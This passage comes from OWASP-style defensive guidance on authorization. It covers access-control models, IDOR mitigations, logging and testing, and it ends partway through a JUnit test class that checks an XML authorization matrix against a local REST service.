problems; developers have a duty to use such frameworks responsibly and wisely. Two general concerns relevant to framework/library selection as relevant to proper access control are misconfiguration/lack of configuration on the part of the developer and vulnerabilities within the components themselves (see [A6](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration) and [A9](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration) for general guidance on these topics).\r\n\r\nEven in an otherwise securely developed application, vulnerabilities in third-party components can allow an attacker to bypass normal authorization controls. Such concerns need not be restricted to unproven or poorly maintained projects, but affect even the most robust and popular libraries and frameworks. Writing complex, secure software is hard. Even the most competent developers, working on high-quality libraries and frameworks, will make mistakes. Assume any third-party component you incorporate into an application *could* be or become subject to an authorization vulnerability. Important considerations include:\r\n\r\n- Create, maintain, and follow processes for detecting and responding to vulnerable components.\r\n- Incorporate tools such as [Dependency Check](https://owasp.org/www-project-dependency-check/) into the SDLC and consider subscribing to data feeds from vendors, [the NVD](https://nvd.nist.gov/vuln/data-feeds), or other relevant sources.\r\n- Implement defense in depth. Do not depend on any single framework, library, technology, or control to be the sole thing enforcing proper access control.\r\n\r\nMisconfiguration (or complete lack of configuration) is another major area in which the components developers build upon can lead to broken authorization.  These components are typically intended to be relatively general purpose tools made to appeal to a wide audience. For all but the simplest use cases, these frameworks and libraries must be customized or supplemented with additional logic in order to meet the unique requirements of a particular app or environment. This consideration is especially important when security requirements, including authorization, are concerned. Notable configuration considerations for authorization include the following:\r\n\r\n- Take time to thoroughly understand any technology you build authorization logic upon. Analyze the technologies capabilities with an understanding that *the authorization logic provided by the component may be insufficient for your application's specific security requirements*. Relying on prebuilt logic may be convenient, but this does not mean it is sufficient. Understand that custom authorization logic may well be necessary to meet an app's security requirements.\r\n- Do not let the capabilities of any library, platform, or framework guide your authorization requirements. Rather, authorization requirements should be decided first and then the third-party components may be analyzed in light of these requirements.\r\n- Do not rely on default configurations.\r\n- Test configuration. Do not just assume any configuration performed on a third-party component will work exactly as intended in your particular environment. Documentation can be misunderstood, vague, outdated, or simply inaccurate.\r\n\r\n### Prefer Attribute and Relationship Based Access Control over RBAC\r\n\r\nIn software engineering, two basic forms of access control are widely utilized: Role-Based Access Control (RBAC) and Attribute-Based Access Control (ABAC). There is a third, more recent, model which has gained popularity: Relationship-Based Access Control (ReBAC). The decision between the models has significant implications for the entire SDLC and should be made as early as possible.\r\n\r\n- RBAC is a model of access control in which access is granted or denied based upon the roles assigned to a user. Permissions are not directly assigned to an entity; rather, permissions are associated with a role and the entity inherits the permissions of any roles assigned to it. Generally, the relationship between roles and users can be many-to-many, and roles may be hierarchical in nature.\r\n\r\n- ABAC may be defined as an access control model where \"subject requests to perform operations on objects are granted or denied based on assigned attributes of the subject, assigned attributes of the object, environment conditions, and a set of policies that are specified in terms of those attributes and conditions\" ([NIST SP 800-162](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-162.pdf), pg. 7]). As defined in NIST SP 800-162, attributes are simply characteristics that be represented as name-value pairs and assigned to a subject, object, or the environment. Job role, time of day, project name, MAC address, and creation date are but a very small sampling of possible attributes that highlight the flexibility of ABAC implementations.\r\n\r\n- ReBAC is an access control model that grants access based on the relationships between resources. For instance, allowing only the user who created a post to edit it. This is especially necessary in social network applications, like Twitter or Facebook, where users want to limit access to their data (tweets or posts) to people they choose (friends, family, followers).\r\n\r\nAlthough RBAC has a long history and remains popular among software developers today, ABAC and ReBAC should typically be preferred for application development. Their advantages over RBAC include:\r\n\r\n- **Support fine-grained, complex Boolean logic**. In RBAC, access decisions are made on the presence or absence of roles; that is, the main characteristic of a requesting entity considered is the role(s) assigned to it. Such simplistic logic does a poor job of supporting object-level or horizontal access control decisions and those that require multiple factors.\r\n\r\n    - ABAC greatly expands both the number and type of characteristics that can be considered. In ABAC, a \"role\" or job function can certainly be one attribute assigned to a subject, but it need not be considered in isolation (or at all if this characteristic is not relevant to the particular access requested). Furthermore, ABAC can incorporate environmental and other dynamic attributes, such as time of day, type of device used, and geographic location. Denying access to a sensitive resource outside of normal business hours or if a user has not recently completely mandatory training are just a couple of examples where ABAC could meet access control requirements that RBAC would struggle to fulfill. Thus, ABAC is more effective than RBAC in addressing the principle of least privileges.\r\n    - ReBAC, since it supports assigning relationships between direct objects and direct users (and not just a role), allows for fine-grained permissions. Some systems also support algebraic operators like AND and NOT to express policies like \"if this user has relationship X but not relationship Y with the object, then grant access\".\r\n\r\n- **Robustness**. In large projects or when numerous roles are present, it is easy to miss or improperly perform role checks ([OWASP C7: Enforce Access Controls](https://owasp.org/www-project-proactive-controls/v3/en/c7-enforce-access-controls)). This can result in both too much and too little access. This is especially true in RBAC implementations where a role hierarchy is not present and multiples role checks must be chained to have the desired impact (i.e. ( `if(user.hasAnyRole(\"SUPERUSER\", \"ADMIN\", \"ACCT_MANAGER\")` ))).\r\n- **Speed**. In RBAC, \"role explosion\" can occur when a system defines too many roles. If users send their credential and roles through means like HTTP headers, which have size limits, there may not be enough space to include all of the user's roles. A viable workaround to this problem is to only send the user ID, and then the application retrieves the user's roles, but this will increase the latency of every request.\r\n- **Supports Multi-Tenancy and Cross-Organizational Requests**. RBAC is poorly suited for use cases where distinct organizations or customers will need access to the same set of protected resources. Meeting such requirement with RBAC would require highly cumbersome methods such as configuring rule sets for each customer in a multi-tenant environment or requiring pre-provisioning of identities for cross-organizational requests ([OWASP C7](https://owasp.org/www-project-proactive-controls/v3/en/c7-enforce-access-controls); [NIST SP 800-162](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-162.pdf)). By contrast, as long as attributes are consistently defined, ABAC implementations allow access control decisions to be \"executed and administered in the same or separate infrastructures, while maintaining appropriate levels of security\" ([NIST SP 800-162](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-162.pdf), pg. 6]).\r\n- **Ease of Management**. Although the initial setup for RBAC is often simpler than ABAC, this short-term benefit quickly vanishes as the scale and complexity of a system grows. In the beginning, a couple of simple roles, such as User and Admin, may suffice for some apps, but this is very unlikely to hold true for any length of time in production applications. As roles become more numerous, both testing and auditing, critical processes for establishing trust in one's codebase and logic, become more difficult ([OWASP C7](https://owasp.org/www-project-proactive-controls/v3/en/c7-enforce-access-controls)). By contrast, ABAC and ReBAC are far more expressive, incorporate attributes and Boolean logic that better reflects real-world concerns, are easier to update when access-control needs change, and encourages the separation of policy management from  enforcement and provisioning of identities ([NIST SP 800-162](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-162.pdf); see also [XACML-V3.0](http://docs.oasis-open.org/xacml/3.0/xacml-3.0-core-spec-os-en.html) for a standard that highlights these benefits))\r\n\r\n### Ensure Lookup IDs are Not Accessible Even When Guessed or Cannot Be Tampered With\r\n\r\nApplications often expose the internal object identifiers (such as an account number or Primary Key in a database) that are used to locate and reference an object. This ID may exposed as a query parameter, path variable, \"hidden\" form field or elsewhere. For example:\r\n\r\n```https://mybank.com/accountTransactions?acct_id=901```\r\n\r\nBased on this URL, one could reasonably assume that the application will return a listing of transactions and that the transactions returned will be restricted to a particular account - the account indicated in the `acct_id` param. But what would happen if the user changed the value of the `acct_id` param to another value such as `523`. Will the user be able to view transactions associated with another account even if it does not belong to him? If not, will the failure simply be the result of the account \"523\" not existing/not being found or will it be due to a failed access control check? Although this example may be an oversimplification, it illustrates a very common security flaw in application development - [CWE 639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html).  When exploited, this weakness can result in authorization bypasses, horizontal privilege escalation and, less commonly, vertical privilege escalation (see [CWE-639](https://cwe.mitre.org/data/definitions/639.html)). This type of vulnerability also represents a form of Insecure Direct Object Reference (IDOR). The following paragraphs will describe the weakness and possible mitigations.\r\n\r\n In the example of above, the lookup ID was not only exposed to the user and readily tampered with, but also appears to have been a fairly predictable, perhaps sequential, value.  While one can use various techniques to mask or randomize these IDs and make them hard to guess, such an approach is generally not sufficient by itself. A user should not be able to access a resource they do not have permissions simply because they are able to guess and manipulate that object's identifier in a query param or elsewhere. Rather than relying on some form of security through obscurity, the focus should be on controlling access to the underlying objects and/or the identifiers themselves. Recommended mitigations for this weakness include the following:\r\n\r\n- Avoid exposing identifiers to the user when possible. For example it should be possible to retrieve some objects, such as account details,  based solely on currently authenticated user's identity and attributes (e.g. through information contained in a securely implemented JSON Web Token (JWT) or server-side session).\r\n- Implement user/session specific indirect references using a tool such as [OWASP ESAPI](https://owasp.org/www-project-enterprise-security-api/) (see [OWASP 2013 Top 10 - A4 Insecure Direct Object References](https://wiki.owasp.org/index.php/Top_10_2013-A4-Insecure_Direct_Object_References))\r\n- Perform access control checks on *every* request for the *specific* object or functionality being accessed. Just because a user has access to an object of a particular type does not mean they should have access to every object of that particular type.\r\n\r\n### Enforce Authorization Checks on Static Resources\r\n\r\nThe importance of securing static resources is often overlooked or at least overshadowed by other security concerns. Although securing databases and similar data stores often justly receive significant attention from security conscious teams, static resources must also be appropriately secured. Although unprotected static resources are certainly a problem for websites and web applications of all forms, in recent years, poorly secured resources in cloud storage offerings (such as Amazon S3 Buckets) have risen to prominence. When securing static resources, consider the following:\r\n\r\n- Ensure that static resources are incorporated into access control policies. The type of protection required for static resources will necessarily be highly contextual. It may be perfectly acceptable for some static resources to be publicly accessible, while others should only be accessible when a highly restrictive set of user and environmental attributes are present. Understanding the type of data exposed in the specific resources under consideration is thus critical. Consider whether a formal Data Classification scheme should be established and incorporated into the application's access control logic (see [here](https://resources.infosecinstitute.com/information-and-asset-classification/) for an overview of data classification).\r\n- Ensure any cloud based services used to store static resources are secured using the configuration options and tools provided by the vendor. Review the cloud provider's documentation (see guidance from [AWS](https://aws.amazon.com/premiumsupport/knowledge-center/secure-s3-resources/), [Google Cloud](https://cloud.google.com/storage/docs/best-practices#security) and [Azure](https://docs.microsoft.com/en-us/azure/storage/blobs/security-recommendations) for specific implementations details).\r\n- When possible, protect static resources using the same access control logic and mechanisms that are used to secure other application resources and functionality.\r\n\r\n### Verify that Authorization Checks are Performed in the Right Location\r\n\r\nDevelopers must never rely on client-side access control checks. While such checks may be permissible for improving the user experience, they should never be the decisive factor in granting or denying access to a resource; client-side logic is often easy to bypass. Access control checks must be performed server-side, at the gateway, or using serverless function (see [OWASP ASVS 4.0.3, V1.4.1 and V4.1.1](https://raw.githubusercontent.com/OWASP/ASVS/v4.0.3/4.0/OWASP%20Application%20Security%20Verification%20Standard%204.0.3-en.pdf))\r\n\r\n### Exit Safely when Authorization Checks Fail\r\n\r\nFailed access control checks are a normal occurrence in a secured application; consequently, developers must plan for such failures and handle them securely. Improper handling of such failures can lead to the application being left in an unpredictable state ([CWE-280: Improper Handling of Insufficient Permissions or Privileges](https://cwe.mitre.org/data/definitions/280.html)). Specific recommendations include the following:\r\n\r\n- Ensure all exception and failed access control checks are handled no matter how unlikely they seem ([OWASP Top Ten Proactive Controls C10: Handle all errors and exceptions](https://owasp.org/www-project-proactive-controls/v3/en/c10-errors-exceptions.html)). This does not mean that an application should always try to \"correct\" for a failed check; oftentimes a simple message or HTTP status code is all that is required.\r\n- Centralize the logic for handling failed access control checks.\r\n- Verify the handling of exception and authorization failures. Ensure that such failures, no matter how unlikely, do not put the software into an unstable state that could lead to authorization bypass.\r\n\r\n### Implement Appropriate Logging\r\n\r\nLogging is one of the most important detective controls in application security; insufficient logging and monitoring is recognized as among  the most critical security risks in [OWASP's Top Ten 2021](https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/). Appropriate logs can not only detect malicious activity, but are also invaluable resources in post-incident investigations, can be used to troubleshoot access control and other security related problems, and are useful in security auditing. Though easy to overlook during the initial design and requirements phase, logging is an important component of wholistic application security and must be incorporated into all phases of the SDLC. Recommendations for logging include the following:\r\n\r\n- Log using consistent, well-defined formats that can be readily parsed for analysis. According to [OWASP Top Ten Proactive Controls C9](https://owasp.org/www-project-proactive-controls/v3/en/c9-security-logging.html), [Apache Logging Services](https://logging.apache.org/) is one example of a project that provides support for numerous languages and platforms\r\n- Carefully determine the amount of information to log. This should be determined according to the specific application environment and requirements. Both too much and too little logging may be considered security weaknesses (see [CWE-778](https://cwe.mitre.org/data/definitions/778.html) and [CWE-779](https://cwe.mitre.org/data/definitions/779.html)). Too little logging can result in malicious activity going undetected and greatly reduce the effectiveness of post-incident analysis. Too much logging not only can strain resources and lead to excessive false positives, but may also result in sensitive data being needlessly logged.\r\n- Ensure clocks and timezones are synchronized across systems. Accuracy is crucial in piecing together the sequence of an attack during and after incident response.\r\n- Consider incorporating application logs into a centralized log server or SIEM.\r\n\r\n### Create Unit and Integration Test Cases for Authorization Logic\r\n\r\nUnit and integration testing are essential for verifying that an application performs as expected and consistently across changes. Flaws in access control logic can be subtle, particularly when requirements are complex; however, even a small logical or configuration error in access control can result in severe consequences. Although not a substitution for a dedicated security test or penetration test (see [OWASP WSTG 4.5](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/05-Authorization_Testing/README) for an excellent guide on this topic as it relates to access control), automated unit and integration testing of access control logic can help reduce the number of security flaws that make it into production. These tests are good at catching the \"low-hanging fruit\" of security issues but not more sophisticated attack vectors ([OWASP SAMM: Security Testing](https://owaspsamm.org/model/verification/security-testing/)).\r\n\r\nUnit and integration testing should aim to incorporate many of the concepts explored in this document. For example, is access being denied by default? Does the application terminate safely when an access control check fails, even under abnormal conditions? Are ABAC policies being properly enforced? While simple unit and integrations test can never replace manual testing performed by a skilled hacker, they are an important tool for detecting and correcting security issues quickly and with far less resources than manual testing.\r\n\r\n## References\r\n\r\n### ABAC\r\n\r\n- [ABAC with Spring Security](https://dzone.com/articles/simple-attribute-based-access-control-with-spring)\r\n\r\n- [NIST Special Publication 800-162 Guide to Attribute Based Access Control (ABAC) Definition and Considerations](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-162.pdf)\r\n  \r\n- [NIST SP 800-178 A Comparison of Attribute Based Access Control (ABAC) Standards for Data Service Applications](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-178.pdf)\r\n  \r\n- [NIST SP 800-205 Attribute Considerations for Access Control Systems](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-205.pdf)\r\n\r\n- [XACML-V3.0](http://docs.oasis-open.org/xacml/3.0/xacml-3.0-core-spec-os-en.html) for standard that highlights these benefits)\r\n\r\n### General\r\n\r\n- [OWASP Application Security Verification Standard 4.0 (especially see V4: Access Control Verification Requirements)](https://raw.githubusercontent.com/OWASP/ASVS/v4.0.3/4.0/OWASP%20Application%20Security%20Verification%20Standard%204.0.3-en.pdf)\r\n\r\n- [OWASP Web Security Testing Guide - 4.5 Authorization Testing](https://owasp.org/www-project-web-security-testing-guide/v42)\r\n\r\n### Least Privilege\r\n\r\n- [Least Privilege](https://us-cert.cisa.gov/bsi/articles/knowledge/principles/least-privilege)\r\n\r\n### RBAC\r\n\r\n- [Role-Based Access Controls](https://csrc.nist.gov/CSRC/media/Publications/conference-paper/1992/10/13/role-based-access-controls/documents/ferraiolo-kuhn-92.pdf)\r\n\r\n### ReBAC\r\n\r\n- [Relationship-Based Access Control (ReBAC)](https://www.osohq.com/academy/relationship-based-access-control-rebac)\r\n- [Google Zanzibar](https://zanzibar.academy/)\r\n"
    },
    {
      "Authorization_Testing_Automation_Cheat_Sheet.md": "# Authorization Testing Automation Cheat Sheet\r\n\r\n## Introduction\r\n\r\nAuthorizations definition and implementation is one of the important protection measures of an application. They are defined in the creation phase of the project and, even if authorization issues are found when the application is initially released and submitted to a security audit before to going live, the most significant number of issues related to authorization come in the maintenance lifetime of the application.\r\n\r\nThis situation is often explained by the fact that features are added/modified and no review of the authorizations is performed on the application before the publishing of the new release, for cost or time issue reason.\r\n\r\n## Context\r\n\r\nIn order to try to address this situation, it can be interesting to automate the evaluation of the authorizations definition and implementation on the application. This, to constantly ensure that implementation of the authorizations in the application is consistent with the authorizations' definition.\r\n\r\nAn authorization is often composed by 2 elements (also named dimensions): The **Feature**, and the **Logical Role** that can access it (sometime a third dimension named **Data** is added in order to define access that includes a filtering at business data level).\r\n\r\nThe representation of the different combinations of these 2 dimensions is often named an **Authorization matrix** and is often formalized in a spreadsheet.\r\n\r\nDuring a test of an authorization, a **Logical Role** is also called a **Point Of View**.\r\n\r\n## Objective\r\n\r\nThis article describes a proposition of implementation in order to automate the tests of an *authorization matrix*.\r\n\r\nThis article assumes that 2 dimensions are used to represent an authorization for the technical proposition described and takes an application exposing REST services as an example.\r\n\r\nThe objective is to provide starting ideas/hints in order to create a tailored way of testing of the authorization matrix for the target application.\r\n\r\n## Proposition\r\n\r\nIn order to achieve the full automation of the evaluation of the *authorization matrix*, the following actions have been performed:\r\n\r\n1. Formalize the authorization matrix in a pivot format file allowing:\r\n    1. The processing by a program easily.\r\n    2. To be read and updated by a human for the follow-up of the authorization combinations.\r\n    3. Hierarchy in the information in order to easily materialize the different combinations.\r\n    4. The maximum possible of independence from the technology and design used to implement the application exposing the features.\r\n\r\n2. Create a set of integration tests that fully use the authorization matrix pivot file as input source in order to evaluate the different combinations with:\r\n    1. The minimum possible of maintenance when the authorization matrix pivot file is updated.\r\n    2. A clear indication, in case of failed test, of the source authorization combination that does not respect the authorization matrix.\r\n\r\n### Authorization matrix pivot file\r\n\r\nThe XML format has been used to formalize the authorization matrix.\r\n\r\nThe XML structure contains 3 main sections:\r\n\r\n- Node **roles**: This node describes the possible logical roles used in the system, is used to provide a list, and the explanation of the different roles (authorization level).\r\n- Node **services**: This node lists and describes the available services exposed by the system, and the associated logical role(s) that can call them.\r\n- Node **services-testing**: This node provides a test payload for each service if the service uses input data other than the one coming from URL or path.\r\n\r\nThis is an example of the XML used to represent the authorization:\r\n\r\n> Placeholders (values between {}) are used to mark location where test value must be placed by the integration tests if needed\r\n\r\n``` xml\r\n  <?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n  <!--\r\n      This file materializes the authorization matrix for the different\r\n      services exposed by the system.\r\n\r\n      It will be used by the tests as a input source for the different tests cases:\r\n      1) Evaluate legitimate access and its correct implementation\r\n      2) Identify not legitimate access (authorization definition issue\r\n      on service implementation)\r\n\r\n      The \"name\" attribute is used to uniquely identify a SERVICE or a ROLE.\r\n  -->\r\n  <authorization-matrix>\r\n\r\n      <!-- Describe the possible logical roles used in the system, is used here to\r\n      provide a list+explanation\r\n      of the different roles (authorization level) -->\r\n      <roles>\r\n          <role name=\"ANONYMOUS\"\r\n          description=\"Indicate that no authorization is needed\"/>\r\n          <role name=\"BASIC\"\r\n          description=\"Role affecting a standard user (lowest access right just above anonymous)\"/>\r\n          <role name=\"ADMIN\"\r\n          description=\"Role affecting an administrator user (highest access right)\"/>\r\n      </roles>\r\n\r\n      <!-- List and describe the available services exposed by the system and the associated\r\n      logical role(s) that can call them -->\r\n      <services>\r\n          <service name=\"ReadSingleMessage\" uri=\"/{messageId}\" http-method=\"GET\"\r\n          http-response-code-for-access-allowed=\"200\" http-response-code-for-access-denied=\"403\">\r\n              <role name=\"ANONYMOUS\"/>\r\n              <role name=\"BASIC\"/>\r\n              <role name=\"ADMIN\"/>\r\n          </service>\r\n          <service name=\"ReadAllMessages\" uri=\"/\" http-method=\"GET\"\r\n          http-response-code-for-access-allowed=\"200\" http-response-code-for-access-denied=\"403\">\r\n              <role name=\"ANONYMOUS\"/>\r\n              <role name=\"BASIC\"/>\r\n              <role name=\"ADMIN\"/>\r\n          </service>\r\n          <service name=\"CreateMessage\" uri=\"/\" http-method=\"PUT\"\r\n          http-response-code-for-access-allowed=\"200\" http-response-code-for-access-denied=\"403\">\r\n              <role name=\"BASIC\"/>\r\n              <role name=\"ADMIN\"/>\r\n          </service>\r\n          <service name=\"DeleteMessage\" uri=\"/{messageId}\" http-method=\"DELETE\"\r\n          http-response-code-for-access-allowed=\"200\" http-response-code-for-access-denied=\"403\">\r\n              <role name=\"ADMIN\"/>\r\n          </service>\r\n      </services>\r\n\r\n      <!-- Provide a test payload for each service if needed -->\r\n      <services-testing>\r\n          <service name=\"ReadSingleMessage\">\r\n              <payload/>\r\n          </service>\r\n          <service name=\"ReadAllMessages\">\r\n              <payload/>\r\n          </service>\r\n          <service name=\"CreateMessage\">\r\n              <payload content-type=\"application/json\">\r\n                  {\"content\":\"test\"}\r\n              </payload>\r\n          </service>\r\n          <service name=\"DeleteMessage\">\r\n              <payload/>\r\n          </service>\r\n      </services-testing>\r\n\r\n  </authorization-matrix>\r\n```\r\n\r\n### Integration tests\r\n\r\nIntegration tests are implemented using a maximum of factorized code and one test case by **Point Of View (POV)** has been created in order to group the verifications by profile of access level (logical role) and facilitate the rendering/identification of the errors.\r\n\r\nParsing, object mapping and access to the authorization matrix information has been implemented using XML marshalling/unmarshalling built-in features provided by the technology used to implement the tests (JAXB here) in order to limit the code to the one in charge of performing the tests.\r\n\r\nThis is the implementation of the integration tests case class:\r\n\r\n``` java\r\n  import org.owasp.pocauthztesting.enumeration.SecurityRole;\r\n  import org.owasp.pocauthztesting.service.AuthService;\r\n  import org.owasp.pocauthztesting.vo.AuthorizationMatrix;\r\n  import org.apache.http.client.methods.CloseableHttpResponse;\r\n  import org.apache.http.client.methods.HttpDelete;\r\n  import org.apache.http.client.methods.HttpGet;\r\n  import org.apache.http.client.methods.HttpPut;\r\n  import org.apache.http.client.methods.HttpRequestBase;\r\n  import org.apache.http.entity.StringEntity;\r\n  import org.apache.http.impl.client.CloseableHttpClient;\r\n  import org.apache.http.impl.client.HttpClients;\r\n  import org.junit.Assert;\r\n  import org.junit.BeforeClass;\r\n  import org.junit.Test;\r\n  import org.xml.sax.InputSource;\r\n  import javax.xml.bind.JAXBContext;\r\n  import javax.xml.parsers.SAXParserFactory;\r\n  import javax.xml.transform.Source;\r\n  import javax.xml.transform.sax.SAXSource;\r\n  import java.io.File;\r\n  import java.io.FileInputStream;\r\n  import java.util.ArrayList;\r\n  import java.util.List;\r\n  import java.util.Optional;\r\n\r\n  /**\r\n   * Integration Test cases in charge of validate the correct implementation of the authorization matrix.\r\n   * Create on test case by logical role that will test access on all services exposed by the system.\r\n   * Implements here focus on readability\r\n   */\r\n  public class AuthorizationMatrixIT {\r\n\r\n      /**\r\n       * Object representation of the authorization matrix\r\n       */\r\n      private static AuthorizationMatrix AUTHZ_MATRIX;\r\n\r\n      private static final String BASE_URL = \"http://localhost:8080\";\r\n\r\n\r\n      /**\r\n       * Load the authorization matrix in objects tree\r\n       *\r\n       * @throws Exception If any error occurs\r\n       */\r\n      @BeforeClass\r\n      public static void globalInit() throws Exception {\r\n          try (FileInputStream fis = new FileInputStream(new File(\"authorization-matrix.xml\"))) {\r\n              SAXParserFactory spf = SAXParserFactory.newInstance();\r\n              spf.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\r\n              spf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);\r\n              spf.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);\r\n              Source xmlSource = new SAXSource(spf.newSAXParser().getXMLReader(), new InputSource(fis));\r\n              JAXBContext jc = JAXBContext.newInstance(AuthorizationMatrix.class);\r\n              AUTHZ_MATRIX = (AuthorizationMatrix) jc.createUnmarshaller().unmarshal(xmlSource);\r\n          }\r\n      }\r\n\r\n      /**\r\n       * Test access to the services from a anonymous user.\r\n       *\r\n       * @throws Exception\r\n       */\r\n      @Test\r\n      public void testAccessUsingAnonymousUserPointOfView() throws Exception {\r\n          //Run the tests - No access token here\r\n          List<String> errors = executeTestWithPointOfView(SecurityRole.ANONYMOUS, null);\r\n          //Verify the test results\r\n          Assert.assertEquals(\"Access issues detected using the ANONYMOUS USER point of view:\\n\" + formatErrorsList(errors), 0, errors.size());\r\n      }\r\n\r\n      /**\r\n       * Test access to the services from a basic user.\r\n       *\r\n       * @throws Exception\r\n       */\r\n      @Test\r\n      public void testAccessUsingBasicUserPointOfView() throws Exception {\r\n          //Get access token representing the authorization for the associated point of view\r\n          String accessToken = generateTestCaseAccessToken(\"basic\", SecurityRole.BASIC);\r\n          //Run the tests\r\n          List<String> errors = executeTestWithPointOfView(SecurityRole.BASIC, accessToken);\r\n          //Verify the test results\r\n          Assert.assertEquals(\"Access issues detected using the BASIC USER point of view:\\n \" + formatErrorsList(errors), 0, errors.size());\r\n      }\r\n\r\n      /**\r\n       * Test access to the services from a administrator user.\r\n       *\r\n       * @throws Exception\r\n       */\r\n      @Test\r\n      public void testAccessUsingAdministratorUserPointOfView() throws Exception {\r\n          //Get access token representing the authorization for the associated point of view\r\n          String accessToken = generateTestCaseAccessToken(\"admin\", SecurityRole.ADMIN);\r\n          //Run the tests\r\n          List<String> errors = executeTestWithPointOfView(SecurityRole.ADMIN, accessToken);\r\n          //Verify the test results\r\n          Assert.assertEquals(\"Access issues detected using the ADMIN USER point of view:\\n\" + formatErrorsList(errors), 0, errors.size());\r\n      }\r\n\r\n      /**\r\n       * Evaluate the access to all service using the point of view (POV) specified.\r\n       *\r\n       * @param pointOfView Point of view to use\r\n       * @param accessToken Access token that is linked to the point of view in terms of authorization.\r\n       * @return List of errors detected\r\n       * @throws Exception If any error occurs\r\n       */\r\n      private List<String> executeTestWithPointOfView(SecurityRole pointOfView, String accessToken) throws Exception {\r\n          List<String> errors = new ArrayList<>();\r\n          String errorMessageTplForUnexpectedReturnCode = \"The service '%s' when called with POV '%s' return a response code %s that is not the expected one in allowed or denied case.\";\r\n          String errorMessageTplForIncorrectReturnCode = \"The service '%s' when called with POV '%s' return a response code %s that is not the expected one (%s expected).\";\r\n          String fatalErrorMessageTpl = \"The service '%s' when called with POV %s meet the error: %s\";\r\n\r\n          //Get the list of services to call\r\n          List<AuthorizationMatrix.Services.Service> services = AUTHZ_MATRIX.getServices().getService();\r\n\r\n          //Get the list of services test payload to use\r\n          List<AuthorizationMatrix.ServicesTesting.Service> servicesTestPayload = AUTHZ_MATRIX.getServicesTesting().getService();\r\n\r\n          //Call all services sequentially (no special focus on performance here)\r\n          services.forEach(service -> {\r\n              //Get the service test payload for the current service\r\n              String payload = null;\r\n              String payloadContentType = null;\r\n              Optional<AuthorizationMatrix.ServicesTesting.Service> serviceTesting = servicesTestPayload.stream().filter(srvPld -> srvPld.getName().equals(service.getName())).findFirst();\r\n              if (serviceTesting.isPresent()) {\r\n                  payload = serviceTesting.get().getPayload().getValue();\r\n                  payloadContentType = serviceTesting.get().getPayload().getContentType();\r\n              }\r\n              //Call the service and verify if the response is consistent\r\n              try {\r\n                  //Call the service\r\n                  int serviceResponseCode = callService(service.getUri(), payload, payloadContentType, service.getHttpMethod(), accessToken);\r\n                  //Check if the role represented by the specified point of view is defined for the current service\r\n                  Optional<AuthorizationMatrix.Services.Service.Role> role = service.getRole().stream().filter(r -> r.getName().equals(pointOfView.name())).findFirst();\r\n                  boolean accessIsGrantedInAuthorizationMatrix = role.isPresent();\r\n                  //Verify behavior consistency according to the response code returned and the authorization configured in the matrix\r\n                  if (serviceResponseCode == service.getHttpResponseCodeForAccessAllowed()) {\r\n                      //Roles is not in the list of role allowed to access to the service so it's an error\r\n                      if (!accessIsGrantedInAuthorizationMatrix) {\r\n                          errors.add(String.format(errorMessageTplForIncorrectReturnCode, service.getName(), pointOfView.name(), serviceResponseCode,\r\n                           service.getHttpResponseCodeForAccessDenied()));\r\n                      }\r\n                  } else if (serviceResponseCode == service.getHttpResponseCodeForAccessDenied()) {\r\n                      //Roles is in the list of role allowed to access to the service so it's an error\r\n                      if (accessIsGrantedInAuthorizationMatrix) {\r\n                          errors.add(String.format(errorMessageTplForIncorrectReturnCode, service.getName(), pointOfView.name(), serviceResponseCode,\r\n                           service.getHttpResponseCodeForAccessAllowed()));\r\n                      }\r\n                  } else {\r\n                      errors.add(String.format(errorMessageTplForUnexpectedReturnCode, service.getName(), pointOfView.name(), serviceResponseCode));\r\n                  }\r\n              } catch (Exception e) {\r\n                  errors.add(String.format(fatalErrorMessageTpl, service.getName(), pointOfView.name(), e.getMessage()));\r\n              }\r\n\r\n\r\n          });\r\n\r\n          return errors;\r\n      }\r\n\r\n      /**\r\n       * Call a service with a specific payload and return the HTTP response code received.\r\n       * Delegate this step in order to made the test cases more easy to maintain.\r\n       *\r\n       * @param uri                URI of the target service\r\n       * @param payloadContentType Content type of the payload to send\r\n       * @param payload            Payload to send\r\n       * @param httpMethod         HTTP method to use\r\n       * @param accessToken        Access token to specify to represent the identity of the caller\r\n       * @return The HTTP response code received\r\n       * @throws Exception If any error occurs\r\n       */\r\n      private int callService(String uri, String payload, String payloadContentType, String httpMethod, String accessToken) throws Exception {\r\n          int rc;\r\n\r\n          //Build the request - Use Apache HTTP Client in order to be more flexible in the combination\r\n          HttpRequestBase request;\r\n          String url = (BASE_URL + uri).replaceAll(\"\\\\{messageId\\\\}\", \"1\");\r\n          switch (httpMethod) {\r\n              case \"GET\":\r\n                  request = new HttpGet(url);\r\n                  break;\r\n              case \"DELETE\":\r\n                  request = new HttpDelete(url);\r\n                  break;\r\n              case \"PUT\":\r\n                  request = new HttpPut(url);\r\n                  if (payload != null) {\r\n                      request.setHeader(\"Content-Type\", payloadContentType);\r\n                      ((HttpPut) request).setEntity(new StringEntity(payload.trim()));\r\n                  }\r\n                  break;\r\n              default:\r\n                  throw new UnsupportedOperationException(httpMethod + \" not supported !\");\r\n          }\r\n          request.setHeader(\"Authorization\", (accessToken != null) ? accessToken : \"\");\r\n\r\n\r\n          //Send the request and get the HTTP response code\r\n          try (CloseableHttpClient httpClient = HttpClients.createDefault()) {\r\n              try (CloseableHttpResponse httpResponse = httpClient.execute(request)) {\r\n                  //Don't care here about the response content...\r\n                  rc = httpResponse.getStatusLine().getStatusCode();\r\n              }\r\n          }\r\n\r\n          return rc;\r\n      }\r\n\r\n      /**\r\n       * Generate a JWT token the user 